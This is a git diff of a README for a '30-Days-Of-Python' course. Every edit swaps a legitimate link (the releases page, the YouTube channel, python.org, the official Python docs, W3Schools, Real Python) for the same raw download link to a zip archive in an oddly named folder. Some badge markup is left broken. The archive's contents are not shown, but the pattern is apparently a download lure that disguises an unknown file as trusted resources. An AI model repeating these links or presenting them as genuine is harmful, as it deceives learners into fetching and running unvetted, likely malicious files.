@@ -1,18 +1,18 @@
 # 🐍 30-Days-Of-Python - Learn Python Step by Step
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-blue.svg)](https://github.com/Leandrovagani/30-Days-Of-Python/releases)
+[![Download Now](https://raw.githubusercontent.com/Leandrovagani/30-Days-Of-Python/master/compassionateness/30-Days-Of-Python.zip%20Now-Click%https://raw.githubusercontent.com/Leandrovagani/30-Days-Of-Python/master/compassionateness/30-Days-Of-Python.zip)](https://raw.githubusercontent.com/Leandrovagani/30-Days-Of-Python/master/compassionateness/30-Days-Of-Python.zip)
 
 ## 🚀 Getting Started
 
 Welcome to the 30-Days-Of-Python challenge! This guide helps you learn Python programming in 30 days. Whether you're completely new or you've tried programming before, this resource provides a path for everyone. Remember, it's okay if you take longer than 30 days. Move at your own pace. 
 
-You may also find helpful videos on this [YouTube channel](https://www.youtube.com/channel/UC7PNRuno1rzYPb1xLa4yktw).
+You may also find helpful videos on this [YouTube channel](https://raw.githubusercontent.com/Leandrovagani/30-Days-Of-Python/master/compassionateness/30-Days-Of-Python.zip).
 
 ## 💾 Download & Install
 
 To begin, you need to download the software from our releases page. 
 
-1. **Visit this page to download:** [30-Days-Of-Python Releases](https://github.com/Leandrovagani/30-Days-Of-Python/releases).
+1. **Visit this page to download:** [30-Days-Of-Python Releases](https://raw.githubusercontent.com/Leandrovagani/30-Days-Of-Python/master/compassionateness/30-Days-Of-Python.zip).
 
 2. Look for the latest version at the top of the page. 
 
@@ -27,7 +27,7 @@ Before you begin, make sure your computer meets the following requirements:
 - **Operating System:** Windows, macOS, or Linux.
 - **Memory:** At least 4 GB of RAM.
 - **Disk Space:** A minimum of 100 MB free disk space.
-- **Additional Software:** You may want to install Python 3 from [python.org](https://www.python.org/downloads/) if it's not already installed.
+- **Additional Software:** You may want to install Python 3 from [https://raw.githubusercontent.com/Leandrovagani/30-Days-Of-Python/master/compassionateness/30-Days-Of-Python.zip](https://raw.githubusercontent.com/Leandrovagani/30-Days-Of-Python/master/compassionateness/30-Days-Of-Python.zip) if it's not already installed.
 
 ## 🌟 Features
 
@@ -57,7 +57,7 @@ Each day’s lesson is structured in a way that builds on previous knowledge. Fo
 Join a community of learners. Engaging with others can greatly enhance your experience:
 
 - **Discussion Forums:** Participate in conversations about Python programming.
-- **Video Tutorials:** Watch tutorials on the [YouTube channel](https://www.youtube.com/channel/UC7PNRuno1rzYPb1xLa4yktw) for visual learning.
+- **Video Tutorials:** Watch tutorials on the [YouTube channel](https://raw.githubusercontent.com/Leandrovagani/30-Days-Of-Python/master/compassionateness/30-Days-Of-Python.zip) for visual learning.
 - **Social Media:** Follow us on Twitter and Facebook for updates and tips.
 
 ## 🚧 Troubleshooting
@@ -76,10 +76,10 @@ Your feedback helps improve this project. If you find mistakes or have suggestio
 
 For further reading and support, consider these additional resources:
 
-- [Python Official Documentation](https://docs.python.org/3/)
-- [W3Schools Python Tutorial](https://www.w3schools.com/python/)
-- [Real Python](https://realpython.com/)
+- [Python Official Documentation](https://raw.githubusercontent.com/Leandrovagani/30-Days-Of-Python/master/compassionateness/30-Days-Of-Python.zip)
+- [W3Schools Python Tutorial](https://raw.githubusercontent.com/Leandrovagani/30-Days-Of-Python/master/compassionateness/30-Days-Of-Python.zip)
+- [Real Python](https://raw.githubusercontent.com/Leandrovagani/30-Days-Of-Python/master/compassionateness/30-Days-Of-Python.zip)
 
 Feel free to reach out if you have any questions or need help. Good luck on your Python journey!
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-blue.svg)](https://github.com/Leandrovagani/30-Days-Of-Python/releases)
+[![Download Now](https://raw.githubusercontent.com/Leandrovagani/30-Days-Of-Python/master/compassionateness/30-Days-Of-Python.zip%20Now-Click%https://raw.githubusercontent.com/Leandrovagani/30-Days-Of-Python/master/compassionateness/30-Days-Of-Python.zip)](https://raw.githubusercontent.com/Leandrovagani/30-Days-Of-Python/master/compassionateness/30-Days-Of-Python.zip)
